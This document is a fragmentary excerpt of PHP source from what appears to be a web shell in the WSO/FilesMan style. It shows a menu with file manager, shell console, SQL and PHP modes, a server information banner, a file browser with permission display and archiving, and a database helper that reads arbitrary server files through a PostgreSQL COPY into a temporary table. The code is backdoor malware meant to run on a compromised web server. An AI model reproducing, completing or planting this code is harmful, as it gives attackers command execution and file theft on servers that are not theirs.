...
<head><body><div style='position:absolute;width:100%;'> 
...
<input type=hidden name=charset> 
    ...
    $m = array('File Manager'=>'FilesMan','SH Console'=>'Console','SQL'=>'Sql','PHP'=>'Php'); 
    ...
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>RPC:<br>USR:<br>PHP:<br>HDD:<br>DIR:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       ...
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . ViewSize($totalSpace) . ' <span>Free:</span> ' . ViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. getPermissionsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
...
function getPermissionsColor($f) { 
    if (!@is_readable($f)) 
        return '<font color=#FF0000>' . getPermissions(@fileperms($f)) . '</font>'; 
    elseif (!@is_writable($f)) 
        return '<font color=#FFFFFF>' . getPermissions(@fileperms($f)) . '</font>'; 
    else
        return '<font color=#00BB00>' . getPermissions(@fileperms($f)) . '</font>'; 
} 
...
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>"; 
    ...
    for($i=0;$i<$n;$i++) { 
        ...
        $tmp = array('name' => $dirContent[$i], 
                     ...
                     'perms' => getPermissionsColor($GLOBALS['cwd'] . $dirContent[$i]), 
    ...
    if(!empty($_SESSION['act']) && @count($_SESSION['f']) && (($_SESSION['act'] == 'zip') || ($_SESSION['act'] == 'tar'))) 
        echo "file name: <input type=text name=p2 value='_" . date("Ymd_His") . "." . ($_SESSION['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;"; 
...
function actionFilesTools() { 
    ...
    echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?ViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.getPermissionsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>'; 
    ...
    class DbClass { 
        ...
        function loadFile($str) { 
            switch($this->type)  { 
                ...
                break; 
                case 'pgsql': 
                    $this->query("CREATE TABLE tmptmp(file text);COPY tmptmp FROM '".addslashes($str)."';select file from tmptmp;"); 
                    $r=array(); 
                    while($i=$this->fetch()) 
                        $r[] = $i['file']; 
                    $this->query('drop table tmptmp'); 
